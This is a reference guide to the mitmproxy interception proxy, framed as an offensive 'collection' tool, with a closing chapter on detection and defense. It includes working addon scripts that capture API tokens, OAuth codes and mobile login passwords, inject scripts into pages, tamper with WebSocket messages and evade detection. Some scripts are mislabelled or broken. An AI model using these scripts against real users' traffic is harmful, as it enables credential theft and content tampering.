---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: mitmproxy
tool_category: HTTP/HTTPS Proxy
github: https://github.com/mitmproxy/mitmproxy
version: 12.2.3
license: MIT
language: Python
---

# mitmproxy - Interactive TLS-Capable Intercepting HTTP Proxy

## Chapter 1: Overview

mitmproxy is a comprehensive, feature-rich man-in-the-middle proxy for HTTP/1, HTTP/2, and WebSockets traffic. It provides three interfaces: a console UI (mitmproxy), a command-line tool (mitmdump), and a web interface (mitmweb).

**Core Function:** Intercept, inspect, modify, and replay HTTP/HTTPS traffic

**Primary Use Cases:**
- Web application security testing
- API debugging and analysis
- Traffic manipulation and replay
- Certificate pinning bypass
- Mobile application traffic inspection
- Automated traffic modification via scripts

**Key Capabilities:**
- SSL/TLS interception with on-the-fly certificate generation
- HTTP/1, HTTP/2, and WebSocket support
- Scriptable via Python addons
- Flow recording and replay
- Transparent proxy mode
- Reverse proxy mode
- SOCKS5 proxy support
- WireGuard integration

**Three Interfaces:**
- **mitmproxy**: Interactive console UI
- **mitmdump**: Command-line version (tcpdump for HTTP)
- **mitmweb**: Browser-based web interface

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt install mitmproxy
```

### From PyPI

```bash
pip install mitmproxy
```

### Verify Installation

```bash
mitmproxy --version
mitmdump --version
mitmweb --version
```

### Install CA Certificate

```bash
# After first run, install the CA certificate
# Certificate location: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Linux (system-wide)
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates

# Firefox (manual)
# Settings > Privacy & Security > Certificates > View Certificates
# Import ~/.mitmproxy/mitmproxy-ca-cert.pem
```

---

## Chapter 3: Architecture and Operation

### Proxy Modes

```
┌─────────────────────────────────────────────────────────────────┐
│                      mitmproxy Modes                            │
├─────────────────────────────────────────────────────────────────┤
│  Regular HTTP Proxy    │ Browser/app configured to use proxy   │
│  Transparent Proxy     │ Network traffic redirected via NAT    │
│  Reverse Proxy         │ Proxy as if it were the server        │
│  SOCKS5 Proxy          │ SOCKS5 protocol support               │
│  Upstream Proxy        │ Forward to another proxy              │
│  WireGuard             │ VPN-based interception                │
└─────────────────────────────────────────────────────────────────┘
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Man-in-the-Middle | T1557 | Intercept communications |
| Network Sniffing | T1040 | Capture network traffic |
| Web Service | T1583.006 | Compromise web infrastructure |

### SSL/TLS Interception Flow

```
1. Client → mitmproxy: HTTPS connection (ClientHello)
2. mitmproxy → Server: Forward ClientHello
3. Server → mitmproxy: ServerHello + Certificate
4. mitmproxy: Generate forged certificate for target domain
5. mitmproxy → Client: Forged certificate
6. Client → mitmproxy: Encrypted request (using forged cert)
7. mitmproxy: Decrypt, inspect, modify
8. mitmproxy → Server: Forward request (re-encrypted)
```

---

## Chapter 4: Command Reference

### Basic Proxy Startup

```bash
# Console UI on default port 8080
mitmproxy

# Command-line version
mitmdump

# Web interface
mitmweb
```

**Explanation:** Start mitmproxy with the respective interface. Default listen port is 8080.

### Custom Port

```bash
mitmproxy -p 8888
mitmdump -p 8888
mitmweb --web-port 8081 -p 8888
```

**Explanation:** Start proxy on custom port 8888, mitmweb on port 8081.

### Transparent Proxy Mode

```bash
mitmproxy --mode transparent
mitmdump --mode transparent
```

**Explanation:** Start in transparent proxy mode. Requires iptables/nftables redirection.

### Set Up Transparent Proxy (Linux)

```bash
# Redirect HTTP traffic
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080

# Redirect HTTPS traffic
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8080

# Start mitmproxy in transparent mode
mitmproxy --mode transparent
```

### Reverse Proxy Mode

```bash
mitmproxy --mode reverse:https://target.local
```

**Explanation:** Act as reverse proxy, forwarding traffic to target.local.

### SOCKS5 Proxy

```bash
mitmproxy --mode socks5
```

**Explanation:** Start as SOCKS5 proxy for applications supporting SOCKS.

### Save Flows to File

```bash
mitmdump -w traffic.flow
mitmdump -w +traffic_%.flow  # New file per timestamp
```

**Explanation:** Record all traffic to a file for later analysis.

### Read Flows from File

```bash
mitmdump -r traffic.flow
mitmproxy -r traffic.flow
```

**Explanation:** Replay or analyze previously recorded traffic.

### Execute Scripts

```bash
mitmdump -s modify_request.py
mitmproxy -s inject_payload.py
```

**Explanation:** Execute Python addon scripts for traffic modification.

### Ignore Hosts

```bash
mitmdump --ignore-hosts "^(?!.*target\.local)"
mitmproxy --ignore-hosts "192\.168\.1\.100"
```

**Explanation:** Forward traffic without interception for specified hosts.

### Custom Certificates

```bash
mitmdump --certs "*.target.local=cert.pem"
```

**Explanation:** Use custom certificate for specific domain.

### Filter Expressions

```bash
# Show only POST requests
mitmproxy --intercept "~m POST"

# Show only specific domain
mitmproxy --view-filter "~d api.target.local"

# Show only 4xx/5xx responses
mitmproxy --view-filter "~s [45]"
```

**Explanation:** Filter traffic display using mitmproxy filter syntax.

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: API Token Extraction

**Setup:**

```bash
# Create script to extract tokens
cat > extract_tokens.py << 'EOF'
from mitmproxy import http
import json

def response(flow: http.HTTPFlow):
    if "token" in flow.response.text.lower():
        data = json.loads(flow.response.text)
        print(f"[+] Token found: {data.get('token', 'N/A')}")
        with open("tokens.txt", "a") as f:
            f.write(f"{flow.request.url} -> {data}\n")
EOF

# Run with script
mitmdump -s extract_tokens.py -w api_traffic.flow
```

**Explanation:** Intercept API responses and extract authentication tokens.

### Scenario 2: OAuth Code Interception

**Setup:**

```bash
# Script to capture OAuth codes
cat > oauth_capture.py << 'EOF'
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if "authorization_code" in flow.request.url:
        print(f"[+] OAuth Code: {flow.request.url}")
        with open("oauth_codes.txt", "a") as f:
            f.write(f"{flow.request.url}\n")
EOF

# Start proxy
mitmdump -s oauth_capture.py -p 8080
```

**Explanation:** Intercept OAuth authorization codes during authentication flow.

### Scenario 3: Mobile App Traffic Analysis

**Setup:**

```bash
# Start mitmweb for visual inspection
mitmweb --web-port 8081 -p 8080

# Configure mobile device proxy to attacker:8080
# Install mitmproxy CA certificate on device
# Capture and analyze app traffic
```

**Explanation:** Use mitmweb for easy visual inspection of mobile application traffic.

### Scenario 4: Certificate Pinning Bypass

**Setup:**

```bash
# Script to bypass certificate pinning
cat > bypass_pinning.py << 'EOF'
from mitmproxy import http
from mitmproxy.certutils import CA

def tls_clienthello(data):
    # Log connection attempts
    print(f"[+] TLS ClientHello to {data.address}")
EOF

mitmdump -s bypass_pinning.py --ssl-insecure
```

**Explanation:** Bypass certificate pinning by using --ssl-insecure flag.

---

## Chapter 6: Detection and Evasion

### Detection Methods

- **Certificate Transparency:** Monitor for unexpected certificate issuances
- **SSL Pinning Logs:** Check for certificate validation failures
- **Network Monitoring:** Detect proxy connections on port 8080
- **Browser Console:** SSL/TLS warnings in developer tools

### Evasion Techniques

1. **Custom Certificates:** Use domain-specific certs with `--certs`
2. **Port Randomization:** Use non-standard ports
3. **Host Filtering:** Use `--ignore-hosts` to avoid detection
4. **Quiet Mode:** Use `-q` to minimize logging

### Stealth Configuration

```bash
# Quiet mode with custom cert
mitmdump -q --certs "*.target.local=real_cert.pem" -p 8443

# Ignore non-target traffic
mitmdump --ignore-hosts "^(?!.*target\.local)"
```

---

## Chapter 7: Scripting and Automation

### Python Addon Structure

```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    """Modify outgoing requests"""
    flow.request.headers["X-Custom-Header"] = "value"

def response(flow: http.HTTPFlow):
    """Modify incoming responses"""
    flow.response.text = flow.response.text.replace("old", "new")

def error(flow: http.HTTPFlow):
    """Handle errors"""
    print(f"Error: {flow.error}")
```

### Common Script Patterns

```bash
# Header injection
mitmdump -s inject_headers.py

# Response modification
mitmdump -s modify_response.py

# Traffic logging
mitmdump -s log_traffic.py -w logs.flow

# Automated testing
mitmdump -s test_script.py -r recorded.flow
```

### Script Examples

**Header Injection:**

```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    flow.request.headers["Authorization"] = "Bearer stolen_token"
```

**Response Replacement:**

```python
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "target.com" in flow.request.url:
        flow.response.content = b"<h1>Compromised</h1>"
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue:** Certificate errors in browser

```bash
# Install mitmproxy CA certificate
# Location: ~/.mitmproxy/mitmproxy-ca-cert.pem

# For system-wide (Linux)
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates
```

**Issue:** No traffic appearing

```bash
# Check proxy is running
netstat -tlnp | grep 8080

# Verify iptables rules (transparent mode)
sudo iptables -t nat -L -n

# Test proxy directly
curl -x http://localhost:8080 http://example.com
```

**Issue:** HTTPS not intercepting

```bash
# Ensure CA cert is installed
# Check --ssl-insecure flag if needed
mitmdump --ssl-insecure -p 8080

# Verify upstream connection
mitmdump -v -p 8080
```

**Issue:** Script not executing

```bash
# Check script syntax
python -c "import script_name"

# Run with verbose logging
mitmdump -v -s script.py
```

### Debug Mode

```bash
mitmdump -vv -p 8080 2>&1 | tee mitmproxy_debug.log
```

### Flow Analysis

```bash
# Convert flow to HAR format
mitmdump -r traffic.flow -w traffic.har --set hardump=true

# Extract specific flows
mitmdump -r traffic.flow --view-filter "~d api.target.local" -w api_flows.flow
```

---

## Chapter 9: Advanced Scripting

### Request Modification Scripts

```python
# inject_creds.py - Inject authentication credentials
from mitmproxy import http

TARGET = "api.target.local"

def request(flow: http.HTTPFlow):
    if TARGET in flow.request.url:
        flow.request.headers["Authorization"] = "Bearer eyJhbGciOiJIUzI1NiIs..."
        flow.request.headers["X-API-Key"] = "stolen-api-key-12345"
```

### Response Modification Scripts

```python
# modify_responses.py - Replace response content
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "target.com" in flow.request.url:
        # Replace entire response body
        flow.response.content = b"<html><body>Hacked</body></html>"
        flow.response.headers["Content-Type"] = "text/html"

def response(flow: http.HTTPFlow):
    # Inject JavaScript into HTML pages
    if flow.response.headers.get("content-type", "").startswith("text/html"):
        inject = "<script>alert('XSS')</script>"
        flow.response.text = flow.response.text.replace("</body>", inject + "</body>")
```

### Traffic Logging Scripts

```python
# log_traffic.py - Comprehensive traffic logger
from mitmproxy import http
import json
from datetime import datetime

def request(flow: http.HTTPFlow):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "method": flow.request.method,
        "url": flow.request.url,
        "headers": dict(flow.request.headers),
        "body": flow.request.get_text(),
    }
    with open("/tmp/requests.jsonl", "a") as f:
        f.write(json.dumps(entry) + "\n")

def response(flow: http.HTTPFlow):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "url": flow.request.url,
        "status_code": flow.response.status_code,
        "headers": dict(flow.response.headers),
        "body": flow.response.get_text()[:1000],
    }
    with open("/tmp/responses.jsonl", "a") as f:
        f.write(json.dumps(entry) + "\n")
```

### WebSocket Interception

```python
# intercept_ws.py - Intercept WebSocket messages
from mitmproxy import websocket
import json

def websocket_message(flow: websocket.WebSocketFlow):
    msg = flow.messages[-1]
    print(f"[WS] {flow.client_conn.address} -> {flow.server_conn.address}")
    print(f"     {'CLIENT' if msg.from_client else 'SERVER'}: {msg.text}")

    # Modify WebSocket messages
    if msg.from_client and "subscribe" in msg.text:
        data = json.loads(msg.text)
        data["channel"] = "admin"
        msg.text = json.dumps(data)
```

### WireGuard Integration

```bash
# mitmproxy supports WireGuard for transparent interception
# Generate WireGuard keys
wg genkey | tee privatekey | wg pubkey > publickey

# Start mitmproxy with WireGuard mode
mitmproxy --mode wireguard --wg-port 51820

# Configure WireGuard client with:
# - Server public key
# - Client private key
# - Allowed IPs: 0.0.0.0/0
# - Endpoint: attacker-ip:51820
```

### Reverse Proxy for API Testing

```bash
# Act as reverse proxy for API server
mitmproxy --mode reverse:https://api.target.local -p 8443

# All requests to localhost:8443 are forwarded to api.target.local
# Useful for testing API modifications
curl -k https://localhost:8443/api/users
```

---

## Chapter 10: Flow Analysis and Replay

### HAR Export

```bash
# Convert flows to HAR (HTTP Archive) format
mitmdump -r traffic.flow -w traffic.har --set hardump=true

# Import HAR into browser devtools for analysis
# Or use online HAR viewers
```

### Flow Filtering

```bash
# Filter by method
mitmproxy --intercept "~m POST"

# Filter by URL
mitmproxy --view-filter "~d api.target.local"

# Filter by status code
mitmproxy --view-filter "~s 4[0-9][0-9]"

# Filter by content type
mitmproxy --view-filter "~t application/json"

# Filter by response size
mitmproxy --view-filter "~b 1000-"  # Larger than 1000 bytes

# Complex filters
mitmproxy --view-filter "~m POST & ~d api.target.local & ~s 200"
```

### Flow Replay

```bash
# Replay all captured flows
mitmdump -r recorded.flow

# Replay specific flows matching filter
mitmdump -r recorded.flow --replay-destination https://staging.api.local

# Replay with modification script
mitmdump -r recorded.flow -s modify_replay.py

# Client replay (replay requests from client side)
mitmdump -r recorded.flow --replay-destination https://target.local
```

### Content Extraction

```bash
# Extract all JSON responses
mitmdump -r traffic.flow --set flow_detail=2 2>/dev/null | \
  python3 -c "
import sys, json
for line in sys.stdin:
    try:
        data = json.loads(line)
        if 'response' in data and 'json' in str(data['response'].get('content_type', '')):
            print(json.dumps(data['response']['content'], indent=2))
    except: pass
"

# Extract all images
mitmdump -r traffic.flow -s extract_images.py

# extract_images.py
# from mitmproxy import http
# import os
# def response(flow: http.HTTPFlow):
#     ct = flow.response.headers.get("content-type", "")
#     if "image" in ct:
#         ext = ct.split("/")[-1]
#         fname = f"/tmp/extracted/{flow.request.url.split('/')[-1]}.{ext}"
#         os.makedirs("/tmp/extracted", exist_ok=True)
#         with open(fname, "wb") as f:
#             f.write(flow.response.content)
```

---

## Chapter 11: Mobile App Interception

### iOS Configuration

```bash
# 1. Start mitmproxy
mitmweb --web-port 8081 -p 8080

# 2. On iOS device, configure proxy:
# Settings → Wi-Fi → (i) → HTTP Proxy → Manual
# Server: attacker-ip, Port: 8080

# 3. Install CA certificate:
# Safari → http://mitm.it → Download iOS profile
# Settings → Profile Downloaded → Install
# Settings → General → About → Certificate Trust Settings → Enable

# 4. Disable certificate pinning (if present):
# Use objection: objection -g com.target.app explore
# sslpinning disable
```

### Android Configuration

```bash
# 1. Start mitmproxy
mitmweb --web-port 8081 -p 8080

# 2. On Android device, configure proxy in Wi-Fi settings

# 3. Install CA certificate:
# Browser → http://mitm.it → Download CA certificate
# Settings → Security → Encryption & credentials → Install a certificate → CA certificate

# 4. Bypass certificate pinning with Frida:
frida -U -f com.target.app -l bypass_pinning.js --no-pause

# bypass_pinning.js:
# Java.perform(function() {
#     var TrustManager = Java.registerClass({...});
#     var SSLContext = Java.use("javax.net.ssl.SSLContext");
#     SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", ...).implementation = function() { ... };
# });
```

### Mobile Traffic Scripting

```python
# capture_mobile_auth.py - Capture mobile app authentication
from mitmproxy import http
import json

def request(flow: http.HTTPFlow):
    if flow.request.method == "POST":
        ct = flow.request.headers.get("content-type", "")
        if "json" in ct:
            try:
                body = json.loads(flow.request.get_text())
                if any(k in str(body).lower() for k in ["password", "token", "auth", "login"]):
                    print(f"[AUTH CAPTURE] {flow.request.url}")
                    print(f"  Body: {json.dumps(body, indent=2)}")
                    with open("/tmp/mobile_auth.json", "a") as f:
                        f.write(json.dumps({"url": flow.request.url, "body": body}) + "\n")
            except json.JSONDecodeError:
                pass
```

---

## Chapter 12: Enterprise Deployment

### Transparent Proxy with nftables

```bash
#!/usr/sbin/nft -f
flush ruleset

table ip mitmproxy_nat {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;

        # Skip proxy's own traffic
        ip daddr != 127.0.0.0/8 tcp dport 80 redirect to :8080
        ip daddr != 127.0.0.0/8 tcp dport 443 redirect to :8080
    }
}

# Start mitmproxy
mitmproxy --mode transparent --showhost
```

### Upstream Proxy Chain

```bash
# Forward through existing corporate proxy
mitmproxy --mode upstream:http://corporate-proxy:3128

# SOCKS5 upstream
mitmproxy --mode upstream:socks5://socks-proxy:1080

# Conditional upstream routing
mitmdump --mode upstream:http://proxy:3128 \
  --set upstream_proxy=^(?!.*internal\.local)
```

### Systemd Service

```ini
# /etc/systemd/system/mitmproxy.service
[Unit]
Description=mitmproxy Intercepting Proxy
After=network.target

[Service]
Type=simple
User=proxy
ExecStart=/usr/bin/mitmdump -q -p 8080 -s /etc/mitmproxy/scripts/capture.py \
  --set upstream_proxy=^(?!.*internal\.local)
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

### Integration with Burp Suite

```bash
# Use mitmproxy as upstream for Burp Suite
# Burp → Options → Connections → Upstream Proxy Servers
# Add: mitmproxy-host:8080

# Or chain mitmproxy → Burp:
mitmdump --mode upstream:http://127.0.0.1:8080 --set ignore_hosts=.*
# Burp listens on 8080, mitmproxy forwards to Burp
```

---

## Chapter 13: Detection and Defense

### Detection Methods

**Network-Level Detection:**
- Proxy traffic on non-standard ports
- Certificate Transparency logs showing unexpected issuances
- SSL/TLS connection patterns indicating MITM
- DNS queries resolving to proxy IPs

**Host-Level Detection:**
- System proxy configuration changes
- Non-trusted CA certificates in trust store
- Certificate warnings in browser console
- Process monitoring for mitmproxy/mitmdump

**Application-Level Detection:**
- Certificate pinning validation failures
- Server certificate chain mismatches
- HSTS header manipulation
- OCSP response anomalies

### Defensive Measures

```bash
# 1. Monitor certificate transparency
# Use tools like certstream to watch for unexpected issuances

# 2. Implement certificate pinning in applications
# Android: Network Security Config
# iOS: NSURLSessionDelegate

# 3. Deploy HSTS preloading
# Add site to HSTS preload list: https://hstspreload.org/

# 4. Monitor proxy configurations
# Check for unexpected system proxy settings
# Windows: netsh winhttp show proxy
# Linux: env | grep -i proxy

# 5. Network monitoring for proxy indicators
sudo tcpdump -i eth0 "tcp port 8080 or tcp port 8443" -w proxy_traffic.pcap
```

---

## Resources

- **GitHub:** https://github.com/mitmproxy/mitmproxy
- **Documentation:** https://docs.mitmproxy.org/
- **Kali Documentation:** https://www.kali.org/tools/mitmproxy/
- **Addons Repository:** https://github.com/mitmproxy/mitmproxy/tree/main/examples
- **Filter Syntax:** https://docs.mitmproxy.org/stable/filters.html
- **Scripting API:** https://docs.mitmproxy.org/stable/addons-requests.html
- **RFC 7230 (HTTP/1.1):** https://tools.ietf.org/html/rfc7230
- **RFC 7540 (HTTP/2):** https://tools.ietf.org/html/rfc7540
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **Mobile Security Testing Guide:** https://mas.owasp.org/
